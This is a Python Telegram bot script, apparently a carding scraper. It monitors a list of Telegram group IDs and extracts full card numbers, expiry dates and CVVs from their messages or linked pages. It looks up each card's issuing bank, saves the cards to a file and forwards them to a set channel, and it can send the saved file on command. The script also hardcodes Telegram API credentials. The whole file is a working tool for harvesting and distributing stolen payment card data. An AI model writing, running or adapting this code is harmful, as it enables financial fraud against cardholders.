from defs import getUrl, getcards, phone
from flask import Flask
import telethon
import asyncio
import os, sys
import re
import requests
from telethon import TelegramClient, events
import random_address
from random_address import real_random_address
import names
from datetime import datetime
import time
import random
from telethon.tl.types import PeerUser, PeerChat, PeerChannel

API_ID = 26274764
API_HASH = 'e804daadc2fa0ae27d89ddfa8c9e7800'

SEND_ID = -1002215624242

client = TelegramClient('sesfyxsion', API_ID, API_HASH)
ccs = []
chats = [
	-1001643200928,
	-1002012960971,
	-1001833380321,
	-1001154809568,
	-1002107923192,
	-1001154809568,
	-1001773534059,
	-1002141856390,
	
]
with open('cards.txt', 'r') as r:
	temp_cards = r.read().splitlines()

for x in temp_cards:
	car = getcards(x)
	if car:
		ccs.append(car[0])
	else:
		continue

@client.on(events.NewMessage(chats=chats, func=lambda x: getattr(x, 'text')))
async def my_event_handler(m):
	if m.reply_markup:
		text = m.reply_markup.stringify()
		urls = getUrl(text)
		if not urls:
			return
		text = requests.get(urls[0]).text
	else:
		text = m.text
	cards = getcards(text)
	if not cards:
		return
	for card in cards:
		cc, mes, ano, cvv = card
		if cc in ccs:
			return
		ccs.append(cc)
		extra = cc[0:0 + 12]
		bin_response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
		if not bin_response:
			return
		bin_json = bin_response.json()
		fullinfo = f"{cc}|{mes}|{ano}|{cvv}"
		print(f'{cc}|{mes}|{ano}|{cvv} - Aprovada [a+]')
		with open('cards.txt', 'a') as w:
			w.write(fullinfo + '\n')
		await client.send_message(
			PeerChannel(SEND_ID),
			f"""
	**[#Bin{bin_json["bin"]} - {bin_json['country_flag']}]**
	━━━━━━━━━━━━━━━━━
	**☇ Card ↯** __{cc}|{mes}|{ano}|{cvv}__
	━━━━━━━━━━━━━━━━━
	**☇ Bank  ↯ __{bin_json['bank']}__**
	**☇ Country  ↯ __[{bin_json['country_name']}] __**
	**☇ Type ↯  __{bin_json['brand']}, {bin_json['level']} {bin_json['type']}__**
	━━━━━━━━━━━━━━━━━
	**☇ Dev  -  @da7eya**
	""",
		)

@client.on(events.NewMessage(outgoing=True, pattern=re.compile(r'.lives')))
async def my_event_handler(m):
	await m.reply(file='cards.txt')
	time.sleep(20)

print("BOT START")
client.start()
client.run_until_disconnected()